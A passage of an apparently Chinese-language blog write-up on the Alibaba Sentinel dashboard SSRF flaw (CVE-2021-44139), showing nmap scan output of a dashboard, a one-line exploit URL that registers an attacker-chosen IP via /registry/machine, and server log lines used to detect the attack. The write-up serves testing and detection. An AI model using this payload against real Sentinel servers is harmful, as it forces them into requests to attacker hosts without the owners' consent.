class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h2><h3 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h3><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span 